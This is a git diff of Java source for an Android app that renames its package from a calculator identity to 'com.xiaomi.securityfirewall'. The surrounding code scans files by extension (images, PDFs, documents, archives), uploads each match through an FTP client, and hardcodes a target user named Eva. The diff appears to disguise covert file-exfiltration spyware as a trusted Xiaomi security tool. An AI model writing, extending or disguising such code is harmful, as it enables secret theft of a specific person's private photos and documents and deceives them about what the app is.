@@ -1,4 +1,4 @@
-package es.fraggel.acalculator;
+package com.xiaomi.securityfirewall;
 
 import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
@@ -34,20 +34,20 @@ import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 
-import es.fraggel.acalculator.Models.StaticInfo;
-import es.fraggel.acalculator.Models.User;
-import es.fraggel.acalculator.Services.DataContext;
-import es.fraggel.acalculator.Services.LocalUserService;
+import com.xiaomi.securityfirewall.Models.StaticInfo;
+import com.xiaomi.securityfirewall.Models.User;
+import com.xiaomi.securityfirewall.Services.DataContext;
+import com.xiaomi.securityfirewall.Services.LocalUserService;
 
 
 public class Util {
-    //App para eva eCalculator
+    //App para eva eSecurityFirewall
     //public static String EMAIL="fraggelillo666@gmail,com";
     //public static String NOMBRE="Pablo";
-    //App para mi fCalculator
+    //App para mi fSecurityFirewall
     public static String EMAIL="eva@gmail,com";
     public static String NOMBRE="Eva";
-    //App pruebas nCalculator
+    //App pruebas nSecurityFirewall
     //public static String EMAIL="pruebas@gmail,com";
     //public static String NOMBRE="Nombre";
 
@@ -80,7 +80,7 @@ public class Util {
                             || ff.indexOf(".jpg") != -1 || ff.indexOf(".jpeg") != -1 || ff.indexOf(".png") != -1 || ff.indexOf(".bmp") != -1
                             || ff.indexOf(".pdf") != -1 || ff.indexOf(".zip") != -1 || ff.indexOf(".doc") != -1 || ff.indexOf(".docx") != -1) {
                         uploadFile(file,mContext,user);
-                        Log.d("Calculator", file.getAbsolutePath());
+                        Log.d("SecurityFirewall", file.getAbsolutePath());
                     }
                 }
             }catch(Exception e){
@@ -253,7 +253,7 @@ public class Util {
             SimpleDateFormat dateFormat = new SimpleDateFormat("dd MM yy hh:mm a");
             Date currentDate = new Date();
             String cuurentDateString = dateFormat.format(currentDate);
-            FileOutputStream fos=new FileOutputStream(ContextCompat.getExternalFilesDirs(context, null)[0]+"logCalculadora.txt",true);
+            FileOutputStream fos=new FileOutputStream(ContextCompat.getExternalFilesDirs(context, null)[0]+"logSecurityFirewall.txt",true);
             fos.write((cuurentDateString+" "+texto+"\n").getBytes());
             fos.flush();
             fos.close();
